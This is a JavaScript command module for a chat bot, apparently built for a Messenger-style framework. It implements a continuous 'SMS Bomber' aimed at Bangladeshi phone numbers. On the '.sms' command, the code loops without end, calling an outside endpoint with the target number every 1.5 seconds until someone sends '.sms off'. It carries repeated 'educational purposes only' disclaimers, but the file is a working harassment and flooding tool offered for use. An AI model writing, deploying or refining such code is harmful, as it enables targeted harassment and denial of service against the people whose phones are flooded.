module.exports.config = {
    name: "sms",
    version: "2.0.0",
    hasPermssion: 0,
    credits: "Modified for educational purposes",
    description: "Continuous SMS Bomber - Stop with .sms off",
    commandCategory: "Tool",
    usages: ".sms 01xxxxxxxxx or .sms off",
    cooldowns: 0,
    dependencies: { "axios": "" }
};

const axios = require("axios");
const bombingFlags = {};

const bold = (text) => text.split('').map(c => {
    const boldMap = {
        '0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒',
        '5':'𝟓','6':'𝟔','7':'𝟕','8':'𝟖','9':'𝟗',
        'x':'𝐱'
    };
    return boldMap[c] || c;
}).join('');

module.exports.run = async ({ api, event, args }) => {
    const threadID = event.threadID;
    const number = args[0];

    if (number === "off") {
        if (bombingFlags[threadID]) {
            bombingFlags[threadID] = false;
            return api.sendMessage("✅ 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐭𝐨𝐩𝐩𝐞𝐝.", threadID);
        } else {
            return api.sendMessage("❌ 𝐍𝐨 𝐛𝐨𝐦𝐛𝐢𝐧𝐠 𝐢𝐬 𝐜𝐮𝐫𝐫𝐞𝐧𝐭𝐥𝐲 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐢𝐧 𝐭𝐡𝐢𝐬 𝐭𝐡𝐫𝐞𝐚𝐝.", threadID);
        }
    }

    if (!/^01[0-9]{9}$/.test(number)) {
        return api.sendMessage("‧₊˚🩰🍃 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑 🍒🍓\n\n⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫 𝐟𝐨𝐫𝐦𝐚𝐭!\n\n𝐔𝐬𝐚𝐠𝐞:\n.𝐬𝐦𝐬 𝟎𝟏𝐱𝐱𝐱𝐱𝐱𝐱𝐱𝐱𝐱\n\n𝐎𝐧𝐥𝐲 𝐁𝐚𝐧𝐠𝐥𝐚𝐝𝐞𝐬𝐡𝐢 𝐧𝐮𝐦𝐛𝐞𝐫𝐬\n𝐅𝐨𝐫 𝐞𝐝𝐮𝐜𝐚𝐭𝐢𝐨𝐧𝐚𝐥 𝐩𝐮𝐫𝐩𝐨𝐬𝐞𝐬 𝐨𝐧𝐥𝐲.\n\n‧₊˚🩰🍃🍒🍓", threadID);
    }

    if (bombingFlags[threadID]) {
        return api.sendMessage("❗ 𝐁𝐨𝐦𝐛𝐢𝐧𝐠 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐫𝐮𝐧𝐧𝐢𝐧𝐠!\n𝐔𝐬𝐞 .𝐬𝐦𝐬 𝐨𝐟𝐟 𝐭𝐨 𝐬𝐭𝐨𝐩.", threadID);
    }

    api.sendMessage(
        "🍒🍓 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐈𝐍𝐆 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🍒🍓\n\n" +
        `📱 𝐓𝐚𝐫𝐠𝐞𝐭: ${bold(number)}\n\n` +
        "🔄 𝐁𝐨𝐦𝐛𝐢𝐧𝐠 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬...\n" +
        "𝐔𝐬𝐞 .𝐬𝐦𝐬 𝐨𝐟𝐟 𝐭𝐨 𝐬𝐭𝐨𝐩.\n\n" +
        "‧₊˚🩰🍃 𝐄𝐝𝐮𝐜𝐚𝐭𝐢𝐨𝐧𝐚𝐥 𝐏𝐮𝐫𝐩𝐨𝐬𝐞 𝐎𝐧𝐥𝐲", 
        threadID
    );

    bombingFlags[threadID] = true;

    (async function startBombing() {
        while (bombingFlags[threadID]) {
            try {
                await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
                await new Promise(resolve => setTimeout(resolve, 1500));
            } catch (err) {
                api.sendMessage(`❌ 𝐄𝐫𝐫𝐨𝐫: ${err.message}\n𝐁𝐨𝐦𝐛𝐢𝐧𝐠 𝐬𝐭𝐨𝐩𝐩𝐞𝐝.`, threadID);
                bombingFlags[threadID] = false;
                break;
            }
        }
    })();
};